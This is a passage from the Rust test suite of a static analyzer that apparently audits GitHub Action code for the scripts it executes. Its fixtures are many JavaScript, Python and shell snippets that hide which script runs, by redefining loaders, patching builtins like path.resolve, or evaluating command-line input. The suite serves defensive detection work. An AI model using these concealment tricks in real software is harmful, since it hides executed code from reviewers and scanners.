                "const callbacks = { run: function () { execFileSync('bash', [Object.values(this)[0]]); } };\nconst o = { file: __dirname + '/install.sh' };\n[1].forEach(callbacks.run, o);",
            ),
            (
                "action/index.js",
                "__dirname += '/sub';\nexecFileSync('bash', [__dirname + '/install.sh']);",
            ),
            (
                "action/index.js",
                "__filename = __dirname + '/sub/install';\nexecFileSync('bash', [__filename + '.sh']);",
            ),
            (
                "action/index.js",
                "eval('__dirname = \"/tmp\"');\nexecFileSync('bash', [__dirname + '/install.sh']);",
            ),
            (
                "action/index.js",
                "execFileSync('/usr/bin/true', [], { shell: __dirname + '/install.sh' });",
            ),
            (
                "action/index.js",
                "fork(__dirname + '/install.js', [], { execPath: __dirname + '/install.sh' });",
            ),
            (
                "action/index.js",
                "const options = { cwd: __dirname, execArgv: ['--require', __dirname + '/install.js'] };\nfork('/usr/lib/node/tool.js', [], options);",
            ),
            (
                "action/index.js",
                "function options(shell) { return { shell }; }\nconst opts = options(__dirname + '/install.sh');\nexecFileSync('/usr/bin/true', opts);",
            ),
            (
                "action/index.js",
                "function options(shell) { return { shell }; }\nconst opts = options(__dirname + '/install.sh');\nexecSync('true', opts);",
            ),
            (
                "action/index.js",
                "function options(shell) { return { shell }; }\nconst opts = options(__dirname + '/install.sh');\nexecFileSync('/usr/bin/true', [], opts);",
            ),
            (
                "action/index.js",
                "function options(shell) { return { shell }; }\nexecFileSync('/usr/bin/true', options(__dirname + '/install.sh'));",
            ),
            (
                "action/index.mjs",
                "import { createRequire, syncBuiltinESMExports, Module as NativeModule } from 'node:module';\nNativeModule.createRequire = (path) => () => path;\nsyncBuiltinESMExports();\nconst loader = createRequire(import.meta.dirname + '/install.sh');\nexecFileSync('bash', [loader('fs')]);",
            ),
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nconst initial = createRequire(import.meta.url);\ninitial.cache.fs = { loaded: true, exports: import.meta.dirname + '/install.sh' };\nexecFileSync('bash', [initial('fs')]);",
            ),
            (
                "action/index.js",
                "function __importStar(module) { return { readFileSync: (path) => path }; }\nconst fake = __importStar(require('fs'));\nconst passthrough = fake.readFileSync;\nexecFileSync('bash', [passthrough(__dirname + '/install.sh')]);",
            ),
            (
                "action/index.js",
                "const fs = require('fs');\nfs.readFileSync = (path) => path;\nconst passthrough = fs.readFileSync;\nexecFileSync('bash', [passthrough(__dirname + '/install.sh')]);",
            ),
            (
                "action/index.js",
                "require = (path) => path;\nconst loader = require;\nconst script = loader(__dirname + '/install.sh');\nexecFileSync('bash', [script]);",
            ),
            (
                "action/index.js",
                "const mod = require('module');\nmod.createRequire = () => (path) => path;\nconst loader = mod.createRequire(__filename);\nconst script = loader(__dirname + '/install.sh');\nexecFileSync('bash', [script]);",
            ),
            (
                "action/index.js",
                "const read = require('fs').readFileSync;\nconst script = read(__dirname + '/install.sh', 'utf8');\nexecSync(script);",
            ),
            (
                "action/index.js",
                "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nexecSync(load('./command.js'));",
            ),
            (
                "action/index.mjs",
                "import { createRequire, syncBuiltinESMExports } from 'node:module';\nconst load = createRequire(import.meta.url);\nexecFileSync(load('os').tmpdir() + '/tool', []);",
            ),
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\neval(process.argv[2]);\nexecFileSync(load('os').tmpdir() + '/tool', []);",
            ),
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nconst mod = load('mod' + 'ule');\nexecFileSync(load('os').tmpdir() + '/tool', []);",
            ),
            (
                "action/index.js",
                "const path = require('path');\nconst runner = { resolve(p) { execFileSync('bash', [p]); } };\npath.resolve = runner.resolve;\npath.resolve(__dirname + '/install.sh');",
            ),
            (
                "action/index.js",
                "function wrap(mod) { return { resolve(p) { execFileSync('bash', [p]); } }; }\nconst path = wrap(require('path'));\npath.resolve(__dirname + '/install.sh');",
            ),
            (
                "action/index.js",
                "const path = require('path');\nfunction patch(target) {\n  target.resolve = function (p) { execFileSync('sh', [p]); };\n}\npatch(path);\npath.resolve(__dirname + '/install.sh');",
            ),
            (
                "action/index.js",
                "const path = require('path'), fs = require('fs');\nfunction patch(target) {\n  target.resolve = function (p) { execFileSync('sh', [p]); };\n}\npatch(path);\npatch(fs);\nfs.resolve(__dirname + '/install.sh');",
            ),
            (
                "action/index.js",
                "const path = require('path');\nconst helpers = { identity(m) { return m; } };\nconst target = helpers.identity.call(null, path);\ntarget.resolve = function (p) { execFileSync('sh', [p]); };\npath.resolve(__dirname + '/install.sh');",
            ),
            (
                "action/index.js",
                "const path = require('path');\nconst runner = { resolve(p) { execFileSync('sh', [p]); } };\npath.run = runner.resolve;\nfunction wrap(m) { return { resolve: m.run }; }\nconst copy = wrap(path);\ncopy.resolve(__dirname + '/install.sh');",
            ),
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nconst loaders = [load];\nexecFileSync(load('os').tmpdir() + '/tool', []);",
            ),
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nFunction.call(null, \"const m = process.getBuiltinModule('module'); m.createRequire = () => () => '/tmp/tool'; m.syncBuiltinESMExports();\")();\nexecFileSync(load('os').tmpdir() + '/tool', []);",
            ),
            (
                "action/index.js",
                "class C { get file() { return __dirname + '/install.sh'; } }\nconst { file } = new C();\nexecFileSync('bash', [file]);",
            ),
            (
                "action/index.js",
                "class C { toString() { return __dirname + '/install.sh'; } }\nexecFileSync('bash', [String(new C())]);",
            ),
            (
                "action/index.js",
                "class C { toJSON() { return __dirname + '/install.sh'; } }\nconst file = JSON.parse(JSON.stringify(new C()));\nexecFileSync('bash', [file]);",
            ),
            (
                "action/index.js",
                "const o = { get() { return 'ignored'; } };\no.get = function () { return this.file; };\no.file = __dirname + '/install.sh';\nconst file = o.get();\nexecFileSync('bash', [file]);",
            ),
            (
                "action/index.js",
                "function parseInt(p) { return p; }\nconst file = parseInt(path.join(__dirname, 'install.sh'));\nexecFileSync('bash', [file]);",
            ),
            (
                "action/index.js",
                "const o = { includes() { return __dirname + '/install.sh'; } };\nconst file = o.includes();\nexecFileSync('bash', [file]);",
            ),
            (
                "action/index.js",
                "const o = { get length() { return __dirname + '/install.sh'; } };\nconst file = o.length;\nexecFileSync('bash', [file]);",
            ),
            (
                "action/index.js",
                "const o = { get(p) { return 'ignored'; } };\nObject.assign(o, { get(p) { return p + '/install.sh'; } });\nconst file = o.get(__dirname);\nexecFileSync('bash', [file]);",
            ),
            (
                "action/index.js",
                "const o = { get() { return 'ignored'; } };\nObject.defineProperty(o, 'get', { value: function () { return this.file; } });\no.file = __dirname + '/install.sh';\nconst file = o.get();\nexecFileSync('bash', [file]);",
            ),
            (
                "action/index.js",
                "class Runner {\n  constructor(p) { this.p = p; }\n  path() { return this.p + '/install.sh'; }\n}\nconst runner = new Runner(__dirname);\nconst helper = runner.path();\nexecFileSync('bash', [helper]);",
            ),
            (
                "action/index.js",
                "function run(p) { execFileSync('bash', [p]); }\nconst invoke = run;\ninvoke(path.join(__dirname, 'install.sh'));",
            ),
            (
                "action/index.js",
                "function run(p) { execFileSync('bash', [p]); }\nPromise.resolve(path.join(__dirname, 'install.sh')).then(run);",
            ),
            (
                "action/index.js",
                "function put(o, p) { o.set('file', p); }\nconst target = new Map();\nput(target, path.join(__dirname, 'install.sh'));\nexecFileSync('bash', [target.get('file')]);",
            ),
            (
                "action/index.js",
                "function put(o, p) { Object.assign(o, { file: p }); }\nconst target = {};\nput(target, path.join(__dirname, 'install.sh'));\nexecFileSync('bash', [target.file]);",
            ),
            (
                "action/index.js",
                "function all(text, pattern) { return pattern.exec(text); }\nall(__dirname, /x/);",
            ),
            (
                "action/index.js",
                "exports.PATTERN = /x/;\nexports.PATTERN.exec(__dirname);",
            ),
            (
                "action/index.js",
                "function run(__dirname) { execFileSync('bash', [__dirname + '/install.sh']); }\nrun(process.argv[2]);",
            ),
            (
                "action/index.js",
                "execFileSync('bash', [settings.GITHUB_ACTION_PATH + '/install.sh']);",
            ),
            (
                "action/index.js",
                "const script = fs.readFileSync(path.join(__dirname, 'install.sh'), 'utf8');\nexecSync(script);",
            ),
            (
                "action/index.js",
                "function make(dir) { return () => dir + '/install.sh'; }\nexecFileSync('bash', [make(__dirname)()]);",
            ),
            (
                "action/index.js",
                "function init(config) { config.helper = __dirname + '/install.sh'; }\nconst settings = {};\ninit(settings);\nexecFileSync('bash', [settings.helper]);",
            ),
            (
                "action/index.js",
                "class Runner { constructor() { this.script = __dirname + '/install.sh'; } }\nfunction go(runner) { execFileSync('bash', [runner.script]); }\ngo(new Runner());",
            ),
            (
                "action/index.js",
                "class A {\n  run(dir) { execFileSync('bash', [dir + '/install.sh']); }\n  main() { this.run(__dirname); }\n}",
            ),
            (
                "action/index.js",
                "let helper = path.join(__dirname, 'install.sh');\nhelper = path.join(__dirname, 'sub', 'install.sh');\nexecFileSync('bash', [helper]);",
            ),
            (
                "action/index.js",
                "execFileSync('bash', [path.join(__dirname, 'sub')]);",
            ),
            (
                "action/index.js",
                "execFileSync('bash', ['install.sh'], { cwd: path.join(__dirname, name) });",
            ),
            (
                "action/main.py",
                "for script in [os.path.join(os.path.dirname(__file__), 'install.sh')]:\n    subprocess.run(['bash', script])",
            ),
            (
                "action/main.py",
                "subprocess.run(['ruby', os.path.join(os.path.dirname(__file__), 'install.rb')])",
            ),
            (
                "action/main.sh",
                "DIR=$(dirname \"$0\")\nDIR=\"$(pick \"$DIR\")\"\nbash \"$DIR/install.sh\"",
            ),
            (
                "action/main.sh",
                "for f in \"$(dirname \"$0\")\"/*.sh; do bash \"$f\"; done",
            ),
            (
                "action/main.sh",
                "cd \"$(dirname \"$0\")/$SUB\"\nbash install.sh",
            ),
            (
                "action/index.js",
                "const dir = process.env.CUSTOM || path.join(__dirname, 'sub');\nspawnSync('bash', [path.join(dir, 'install.sh')]);",
            ),
            (
                "action/index.js",
                "const config = { helper: __dirname + '/install.sh' };\nconfig.helper = pick(config.helper);\nexecFileSync('bash', [config.helper]);",
            ),
            (
                "action/index.js",
                "const helpers = [__dirname + '/install.sh'];\nexecFileSync('bash', [helpers[0]]);",
            ),
            (
                "action/index.js",
                "const args = [__dirname + '/install.sh'];\nargs.push(extra);\nexecFileSync('bash', [...args]);",
            ),
            (
                "action/index.js",
                "function identity(p) { return p; }\nconst root = __dirname;\nexecFileSync('bash', [identity(root) + '/install.sh']);",
            ),
            (
                "action/index.js",
                "let a = __dirname;\na = __dirname;\nlet b = a;\nb = a;\nexecFileSync('bash', [b + '/install.sh']);",
            ),
            (
                "action/main.py",
                "config = {'helper': os.path.dirname(__file__) + '/install.sh'}\nsubprocess.run(['bash', config['helper']])",
            ),
            (
                "action/main.py",
                "root = os.path.dirname(__file__)\ndef identity(p):\n    return p\nhelper = identity(root) + '/install.sh'\nsubprocess.run(['bash', helper])",
            ),
            (
                "action/main.sh",
                "cd \"$GITHUB_ACTION_PATH\"\nif false; then cd /tmp; fi\nbash install.sh",
            ),
            (
                "action/main.sh",
                "DIR=\"$GITHUB_ACTION_PATH\"\nif false; then DIR=/tmp; fi\nbash \"$DIR/install.sh\"",
            ),
            (
                "action/main.sh",
                "cd \"$GITHUB_ACTION_PATH\"\ntest -d x && cd /tmp\nbash install.sh",
            ),
            (
                "action/main.sh",
                "cd \"$GITHUB_ACTION_PATH\"\nfor pass in 1 2; do\n  bash install.sh\n  cd sub\ndone",
            ),
        ] {
            assert!(!follow(&LOCATED_TREE, entry, source).0, "{source}");
        }
        let aliases: String = (1..=80)
            .map(|index| format!("const a{index} = a{};\n", index - 1))
            .collect();
        let source =
            format!("const a0 = __dirname;\n{aliases}execFileSync('bash', [a80 + '/install.sh']);");
        assert!(!follow(&LOCATED_TREE, "action/index.js", &source).0);
    }

    #[test]
    fn doubling_argument_vectors_stay_bounded() {
        // Forty doublings would be 2^41 words if each alias were expanded.
        assert!(!follow(&LOCATED_TREE, "action/main.py", "import os, subprocess\nargs0 = ['bash', os.path.dirname(__file__) + '/install.sh']\nargs1 = args0 + args0\nargs2 = args1 + args1\nargs3 = args2 + args2\nargs4 = args3 + args3\nargs5 = args4 + args4\nargs6 = args5 + args5\nargs7 = args6 + args6\nargs8 = args7 + args7\nargs9 = args8 + args8\nargs10 = args9 + args9\nargs11 = args10 + args10\nargs12 = args11 + args11\nargs13 = args12 + args12\nargs14 = args13 + args13\nargs15 = args14 + args14\nargs16 = args15 + args15\nargs17 = args16 + args16\nargs18 = args17 + args17\nargs19 = args18 + args18\nargs20 = args19 + args19\nargs21 = args20 + args20\nargs22 = args21 + args21\nargs23 = args22 + args22\nargs24 = args23 + args23\nargs25 = args24 + args24\nargs26 = args25 + args25\nargs27 = args26 + args26\nargs28 = args27 + args27\nargs29 = args28 + args28\nargs30 = args29 + args29\nargs31 = args30 + args30\nargs32 = args31 + args31\nargs33 = args32 + args32\nargs34 = args33 + args33\nargs35 = args34 + args34\nargs36 = args35 + args35\nargs37 = args36 + args36\nargs38 = args37 + args37\nargs39 = args38 + args38\nargs40 = args39 + args39\nsubprocess.run(args40)").0);
    }

    #[test]
    fn location_references_outside_execution_stay_complete() {
        for (entry, source) in [
            (
                "action/index.js",
                "globalThis[''] = {};\nglobalThis[''].file = __dirname + '/install.sh';\nglobalThis.other = { file: 'install.sh' };\nexecFileSync('bash', [globalThis.other.file]);",
            ),
            (
                "action/index.js",
                "process.env.SCRIPT = __dirname + '/install.sh';\nconst { HOME } = process.env;\nconst env = process.env;\nexecFileSync('git', ['-C', process.cwd(), 'status', HOME, env.USER]);",
            ),
            (
                "action/index.js",
                "function run() { execFileSync('bash', [this.file]); }\nrun.call({ file: 'install.sh' });",
            ),
            (
                "action/index.js",
                "execFileSync('git', ['status'], { cwd: __dirname, encoding: 'utf8' });",
            ),
            (
                "action/index.js",
                "const box = { g: { bucket: {} } };\nconst g = box.g;\ng.bucket.file = __dirname + '/install.sh';\nglobalThis.bucket = { file: 'install.sh' };\nexecFileSync('bash', [globalThis.bucket.file]);",
            ),
            (
                "action/index.js",
                "const o = { get file() { return 'install.sh'; } };\nexecFileSync('bash', [Object.values(o)[0]]);",
            ),
            (
                "action/index.js",
                "function options() { return { encoding: 'utf8' }; }\nconst opts = options();\nconst root = __dirname;\nexecFileSync('git', opts);",
            ),
            (
                "action/index.js",
                "const args = ['status'];\nexecFileSync('git', args, { cwd: __dirname });",
            ),
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nconst require = createRequire(import.meta.url);\nconst fs = require('node:fs');\nconst text = fs.readFileSync('config.json', 'utf8');\nexecFileSync('git', ['status', text]);",
            ),
            (
                "action/index.js",
                "class Runner {\n  constructor(p) { this.p = p; }\n  run() { return 0; }\n}\nconst code = new Runner(__dirname).run();\nexecFileSync('bash', ['install.sh', String(code)]);",
            ),
            (
                "action/index.js",
                "const width = __dirname.length;\nconst deep = __dirname.indexOf('/') > 0;\nexecFileSync('bash', ['install.sh', String(width), String(deep)]);",
            ),
            (
                "action/index.js",
                "const matcher = /x/;\nmatcher.lastIndex = 0;\n'text'.replace(matcher, '');\nmatcher.exec(__dirname);",
            ),
            (
                "action/index.js",
                "var matcher;\nmatcher = new RegExp('x');\nconst root = __dirname;\nmatcher.exec(root);",
            ),
            (
                "action/index.js",
                "function size(p) { return 1; }\nconst n = size(__dirname);\nexecFileSync('bash', [String(n)]);",
            ),
            (
                "action/index.js",
                "process.env.TOOL = path.join(__dirname, 'bin');\nexecFileSync('bash', [process.env.HOME + '/x.sh']);",
            ),
            (
                "action/index.js",
                "function a() { const helper = __dirname; return helper.length; }\nfunction b(helper) { execFileSync('bash', [helper]); }\nb(process.argv[2]);",
            ),
            (
                "action/index.js",
                "process.stdout.write(__dirname);\nconst sink = { write(data) { execFileSync('bash', [data]); } };\nsink.write(process.argv[2]);",
            ),
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nconst require = createRequire(import.meta.url);\nconst cp = require('node:child_process');\ncp.execFileSync('git', ['status']);",
            ),
            (
                "action/index.js",
                "const path = require('path');\nconst runner = { resolve(p) { execFileSync('bash', [p]); } };\nconst file = path.resolve(__dirname, 'install.sh');",
            ),
            (
                "action/index.js",
                "var __create = Object.create;\nvar __defProp = Object.defineProperty;\nvar __getOwnPropNames = Object.getOwnPropertyNames;\nvar __getProtoOf = Object.getPrototypeOf;\nvar __hasOwnProp = Object.prototype.hasOwnProperty;\nvar __copyProps = (to, from, except) => {\n  if (from && typeof from === 'object' || typeof from === 'function') {\n    for (let key of __getOwnPropNames(from))\n      if (!__hasOwnProp.call(to, key) && key !== except)\n        __defProp(to, key, { get: () => from[key], enumerable: true });\n  }\n  return to;\n};\nvar __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(isNodeMode || !mod || !mod.__esModule ? __defProp(target, 'default', { value: mod, enumerable: true }) : target, mod));\nvar path = __toESM(require('path'), 1);\nconst runner = { resolve(p) { execFileSync('bash', [p]); } };\nconst file = path.resolve(__dirname, 'install.sh');",
            ),
            (
                "action/index.mjs",
                "import { createRequire as __WEBPACK_EXTERNAL_createRequire } from \"module\";\nconst os = __WEBPACK_EXTERNAL_createRequire(import.meta.url)(\"os\");\nconst cp = __WEBPACK_EXTERNAL_createRequire(import.meta.url)(\"child_process\");\ncp.execFileSync(os.tmpdir() + '/tool', ['--version']);",
            ),
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nlet load;\nload = createRequire(import.meta.url);\nconst os = load('node:os');\nif (typeof load === 'function') execFileSync(os.tmpdir() + '/tool', []);",
            ),
            (
                "action/main.sh",
                "DIR=$(dirname \"$0\")\nDIR=/opt/tools\nbash \"$DIR/install.sh\"",
            ),
            (
                "action/main.sh",
                "pushd \"$(dirname \"$0\")/sub\"\npopd\nbash install.sh",
            ),
            (
                "action/main.sh",
                "cd \"$(dirname \"$0\")\" && npm ci && make build",
            ),
            (
                "action/main.sh",
                "for file in \"$(dirname \"$0\")\"/*.json; do\n  cat \"$file\"\ndone",
            ),
            (
                "action/index.js",
                "let i = 0;\ni = i + 1;\nconst root = __dirname;\n/x/.exec(i);",
            ),
            (
                "action/main.py",
                "HERE = os.path.dirname(__file__)\nsubprocess.run(['git', 'status'], cwd=HERE)",
            ),
            (
                "action/main.py",
                "subprocess.run(['echo', os.path.dirname(__file__)])",
            ),
            (
                "action/index.js",
                "const root = path.join(__dirname, 'sub');\nconst match = /install/.exec(root);",
            ),
            (
                "action/index.js",
                "const pattern = /install/g;\nconst root = path.join(__dirname, 'sub');\npattern.exec(root);",
            ),
            (
                "action/index.js",
                "const kSocket = Symbol('socket');\nconst client = {};\nconst { [kSocket]: socket } = client;\nconst { [process.argv[2]]: field } = { a: 1 };\nconst pattern = /install/;\npattern.exec(__dirname);",
            ),
            (
                "action/index.js",
                "const options = { cwd: __dirname, encoding: 'utf8' };\nconst encoding = options.encoding;\nexecFileSync('git', ['status'], { encoding });",
            ),
        ] {
            assert_eq!(
                follow(&LOCATED_TREE, entry, source),
                (true, vec![]),
                "{source}"
            );
        }
    }

    #[test]
    fn loader_replacement_anywhere_in_the_action_withdraws_the_native_loader() {
        let tree: Vec<_> = ["action/index.mjs", "action/bridge.cjs"]
            .iter()
            .map(|path| tree_entry(path, "blob"))
            .collect();
        let index = "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nexecFileSync(load('os').tmpdir() + '/tool', []);";
        for (bridge, complete) in [
            ("module.exports = { retries: 3 };", true),
            ("require('module').syncBuiltinESMExports();", false),
            ("require.cache.os = { loaded: true, exports: {} };", false),
            ("new Function('m', process.argv[2])(require);", false),
        ] {
            let mut targets = vec![
                ("action/index.mjs".to_string(), SourceFileKind::JavaScript),
                ("action/bridge.cjs".to_string(), SourceFileKind::JavaScript),
            ];
            let contents = [Some(Ok(index.to_string())), Some(Ok(bridge.to_string()))];
            assert_eq!(
                follow_source_dependencies(
                    &tree,
                    true,
                    "action",
                    &mut targets,
                    &contents,
                    &mut HashMap::new(),
                    &mut HashSet::new(),
                ),
                complete,
                "{bridge}"
            );
        }
    }

    #[test]
    fn a_builtin_method_patched_anywhere_in_the_action_is_followed() {
        let tree: Vec<_> = ["action/index.js", "action/bridge.js", "action/install.sh"]
            .iter()
            .map(|path| tree_entry(path, "blob"))
            .collect();
        let index = "const path = require('path');\nconst runner = { resolve(p) { execFileSync('bash', [p]); } };\npath.resolve(__dirname + '/install.sh');";
        for (bridge, complete) in [
            ("module.exports = { retries: 3 };", true),
            (
                "require('path').resolve = function (p) { return p; };",
                false,
            ),
        ] {
            let mut targets = vec![
                ("action/index.js".to_string(), SourceFileKind::JavaScript),
                ("action/bridge.js".to_string(), SourceFileKind::JavaScript),
            ];
            let contents = [Some(Ok(index.to_string())), Some(Ok(bridge.to_string()))];
            assert_eq!(
                follow_source_dependencies(
                    &tree,
                    true,
                    "action",
                    &mut targets,
                    &contents,
                    &mut HashMap::new(),
                    &mut HashSet::new(),
                ),
                complete,
                "{bridge}"
            );
        }
    }

    #[test]
    fn builtin_patches_are_reported_by_member() {
        for (source, patched) in [
            ("require('fs').close = function () {};", vec!["fs:close"]),
            (
                "const stream = require('stream');\nObject.defineProperty(stream, 'promises', { get() {} });",
                vec!["stream:promises"],
            ),
            ("Object.assign(require('path'), helpers);", vec!["path:*"]),
            (
                "const path = require('path');\nfunction patch(target) { target.resolve = function () {}; }\npatch(path);",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nconst helpers = { patch(t) { t.resolve = function () {}; } };\nhelpers.patch(path);",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path'), fs = require('fs');\nfunction patch(target) { target.resolve = function () {}; }\npatch(path);\npatch(fs);",
                vec!["fs:resolve", "path:resolve"],
            ),
            (
                "const path = require('path');\nfunction patch(t) { t.resolve = function () {}; }\npatch.call(null, path);",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nconst helpers = { identity(m) { return m; } };\nconst target = helpers.identity(path);\ntarget.resolve = function () {};",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nconst helpers = { identity(m) { return m; } };\nconst target = helpers.identity.call(null, path);\ntarget.resolve = function () {};",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nfunction identity(m) { return m; }\nconst target = identity.call(null, path);\ntarget.resolve = function () {};",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nconst target = (function (m) { return m; }).call(null, path);\ntarget.resolve = function () {};",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nlet identity;\nidentity = (m) => m;\nconst target = identity(path);\ntarget.resolve = function () {};",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nlet helpers = {};\nhelpers = { identity(m) { return m; } };\nconst target = helpers.identity(path);\ntarget.resolve = function () {};",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nvar identity = null;\nvar identity = function (m) { return m; };\nconst target = identity(path);\ntarget.resolve = function () {};",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nfunction identity() { return null; }\nfunction identity(m) { return m; }\nconst target = identity(path);\ntarget.resolve = function () {};",
                vec!["path:resolve"],
            ),
            (
                "function load() { return require('path'); }\nconst target = load();\ntarget.resolve = function () {};\nload = null;",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nconst helpers = { patch(t) { t.resolve = function () {}; } };\nhelpers.patch.call(null, path);",
                vec!["path:resolve"],
            ),
            (
                "const path = require('path');\nconst helpers = { call(t) { t.resolve = function () {}; } };\nhelpers.call(path);",
                vec!["path:resolve"],
            ),
            (
                "Object.assign.call(null, require('path'), helpers);",
                vec!["path:*"],
            ),
            (
                "const fsp = require('fs').promises;\nfsp.readFile = function () {};",
                vec!["fs:readFile"],
            ),
            (
                "import fsp from 'node:fs/promises';\nfsp.readFile = function () {};",
                vec!["fs:readFile"],
            ),
            ("require('events').defaultMaxListeners = 20;", vec![]),
            ("const local = {};\nlocal.close = function () {};", vec![]),
            (
                "const { promisify } = require('util');\nconst fs = require('fs');\nconst read = promisify(fs.readFile);\nif (fs && typeof fs.existsSync === 'function') require('path').join('a', 'b');",
                vec![],
            ),
            (
                "var __create = Object.create;\nvar __defProp = Object.defineProperty;\nvar __getOwnPropNames = Object.getOwnPropertyNames;\nvar __getProtoOf = Object.getPrototypeOf;\nvar __hasOwnProp = Object.prototype.hasOwnProperty;\nvar __copyProps = (to, from, except) => {\n  if (from && typeof from === 'object' || typeof from === 'function') {\n    for (let key of __getOwnPropNames(from))\n      if (!__hasOwnProp.call(to, key) && key !== except)\n        __defProp(to, key, { get: () => from[key], enumerable: true });\n  }\n  return to;\n};\nvar __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(isNodeMode || !mod || !mod.__esModule ? __defProp(target, 'default', { value: mod, enumerable: true }) : target, mod));\nvar path = __toESM(require('path'), 1);\npath.join('a', 'b');",
                vec![],
            ),
        ] {
            let use_ = crate::audit_javascript::builtin_use("action/index.js", source);
            assert!(!use_.replaces_loader, "{source}");
            assert_eq!(use_.patched, patched, "{source}");
        }
    }

    #[test]
    fn bundler_loader_idioms_do_not_replace_the_loader() {
        for source in [
            "var root = freeGlobal || freeSelf || Function('return this')();",
            "module.exports = eval(\"require\")(\"kerberos\");",
            "const bind = Function.bind;\nconst hasOwn = Function.call.bind(Object.prototype.hasOwnProperty);",
            "const source = Function.prototype.toString.call(fn);\nif (x instanceof Function) run();",
            "var funcProto = Function.prototype;\nconst has = Function.prototype[Symbol.hasInstance];\nObject.defineProperty(Function.prototype, 'once', { value() {} });",
            "var bind;\nbind = Function.bind;",
            "var promise = import(\"./\" + __nccwpck_require__.u(chunkId));",
            "safer.kStringMaxLength = process.binding('buffer').kStringMaxLength;",
            "import { createRequire } from 'module';\nconst mod = createRequire(import.meta.url)('node:module');\nlet load;\nload = (0, mod.createRequire)(import.meta.url);\nconst fs = load('fs');\nif (typeof load === 'function') fs.existsSync('x');",
            "if (require.main === module) main();\nconst file = require.resolve('./x');",
        ] {
            assert!(
                !crate::audit_javascript::builtin_use("action/index.mjs", source).replaces_loader,
                "{source}"
            );
        }
        for source in [
            "import { Module } from 'node:module';",
            "import * as mod from 'node:module';",
            "const vm = require('vm');",
            "const name = process.argv[2];\nrequire(name);",
            "await import(process.argv[2]);",
            "import('data:text/javascript,1');",
            "eval(process.argv[2]);",
            "const run = eval;",
            "new Function(process.argv[2]);",
            "Function.call(null, 'return 1')();",
            "Function.apply(null, ['return 1'])();",
            "Function.bind(null, 'return 1')();",
            "const C = Function.prototype.constructor;",
            "const F = Function.constructor;",
            "process.getBuiltinModule('module');",
            "const main = process.mainModule;",
            "const cache = require.cache;",
            "module.constructor._load('fs');",
            "obj.constructor.createRequire = () => {};",
            "globalThis.eval(process.argv[2]);",
        ] {
            assert!(
                crate::audit_javascript::builtin_use("action/index.mjs", source).replaces_loader,
                "{source}"
            );
        }
    }

    #[test]
    fn javascript_self_located_executions_resolve_or_fail_closed() {
        let tree = ["action/index.js", "action/install.sh", "action/config.json"];
        for source in [
            "require('child_process').execFileSync('bash', [path.join(__dirname, 'install.sh')]);",
            "require('child_process').execSync('bash ' + __dirname + '/install.sh');",
            "require('child_process').execSync(`bash ${__dirname}/install.sh`);",
            "cp.spawnSync('sh', [require('path').resolve(__dirname, 'install.sh')]);",
            "execSync('bash ' + fileURLToPath(new URL('./install.sh', import.meta.url)));",
            "exec.exec('bash', [`${__dirname}/install.sh`]);",
        ] {
            assert_eq!(
                follow(&tree, "action/index.js", source),
                (true, vec!["action/install.sh".to_string()]),
                "{source}"
            );
        }
        for source in [
            "const config = fs.readFileSync(path.join(__dirname, 'config.json'));",
            "execSync('git status', { cwd: __dirname });",
            "exec.exec('npm', ['ci'], { cwd: path.join(__dirname, '..') });",
            "__nccwpck_require__.ab = __dirname + \"/\";",
        ] {
            assert_eq!(
                follow(&tree, "action/index.js", source),
                (true, vec![]),
                "{source}"
            );
        }
        for source in [
            "execFileSync('bash', [path.join(__dirname, name)]);",
            "spawn(path.join(__dirname, 'missing.sh'));",
        ] {
            assert!(!follow(&tree, "action/index.js", source).0, "{source}");
        }
    }

    #[test]
    fn javascript_copied_sources_resolve_or_fail_closed() {
        let tree = ["action/index.js", "action/index1.js", "action/config.json"];
        for source in [
            "io_cp(__dirname + '/index1.js', '/opt/tofu');",
            "const duplicate = io_cp; duplicate(__dirname + '/index1.js', '/opt/tofu');",
            "fs.copyFileSync(__dirname + '/index1.js', '/opt/tofu');",
            "fs.cpSync(__dirname + '/index1.js', '/opt/tofu');",
            "const duplicate = fs.copyFileSync; duplicate(__dirname + '/index1.js', '/opt/tofu');",
            "fs.writeFileSync('/opt/tofu', fs.readFileSync(__dirname + '/index1.js'), { mode: 0o755 });",
            "fs.createReadStream(__dirname + '/index1.js').pipe(fs.createWriteStream('/opt/tofu', { mode: 0o755 }));",
        ] {
            assert_eq!(
                follow(&tree, "action/index.js", source),
                (true, vec!["action/index1.js".to_string()]),
                "{source}"
            );
        }
        assert_eq!(
            follow(
                &tree,
                "action/index.js",
                "io_cp(__dirname + '/config.json', '/opt/config.json');"
            ),
            (true, vec![])
        );
        assert!(
            !follow(
                &tree,
                "action/index.js",
                "io_cp(__dirname + '/' + name, '/opt/tofu');"
            )
            .0
        );
        assert_eq!(
            follow(
                &tree,
                "action/index.js",
                r#"function __nccwpck_require__() {}
__nccwpck_require__.ab = new URL('.', import.meta.url).pathname.slice(import.meta.url.match(/^file:\/\/\/\w:/) ? 1 : 0, -1) + '/';
io_cp(__nccwpck_require__.ab + 'index1.js', '/opt/tofu');"#
            ),
            (false, vec!["action/index1.js".to_string()])
        );
    }

    #[test]
